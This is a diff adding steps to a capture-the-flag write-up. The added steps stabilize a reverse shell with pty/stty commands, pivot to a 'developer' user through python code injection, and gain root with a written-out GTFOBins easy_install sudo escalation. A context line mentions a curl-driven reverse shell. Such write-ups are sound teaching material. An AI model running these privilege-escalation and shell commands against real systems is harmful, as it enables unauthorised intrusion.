@@ -184,4 +184,47 @@ Running the script and passing the file test.php which will run `ls -la ` as an 
 So i changed the payload script to give us a reverse shell by making a curl request to our host and executing a reverse shell 
 ![image](https://user-images.githubusercontent.com/127159644/224458309-c26533ea-760a-47d3-9d5f-90319023f770.png)
 
+Now lets stabilize our shell
+
+```
+python3 -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm
+CTRL +Z
+stty raw -echo;fg
+reset
+```
+
+In the user's directory /dev there's an suid binary and a python file
+![image](https://user-images.githubusercontent.com/127159644/224458942-fd737115-2ddd-47a5-8be5-a88f2ab4ca67.png)
+
+The file is a simple python script which receives our input then makes a GET request on our input
+![image](https://user-images.githubusercontent.com/127159644/224459018-ff8d5252-abc5-4247-851f-a1a0e9b004d3.png)
+
+Using python code injection i'll get shell as developer [Code Injection](https://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_3-Code-Injections.pdf)
+![image](https://user-images.githubusercontent.com/127159644/224459098-fbe91ebb-3b97-442c-bd29-b7fc7d40e04b.png)
+
+Now that we're user `developer` lets escalate privilege to root 
+
+Checking for sudo permission shows this
+![image](https://user-images.githubusercontent.com/127159644/224459347-8dce3e39-bee8-4037-9733-7b06bcc75e17.png)
+
+After i checked [GTFOBINS](https://gtfobins.github.io/gtfobins/easy_install/#sudo) I got a privilege escalation way for `easy_install`
+
+Doing:
+
+```
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo easy_install $TF
+```
+
+Give us shell 
+![image](https://user-images.githubusercontent.com/127159644/224459457-34162262-9d26-4b6f-a657-b491e0957ee5.png)
+
+
+And we're done :ghost
+
+<br>
+[Back To Home](../index.md)
+
 
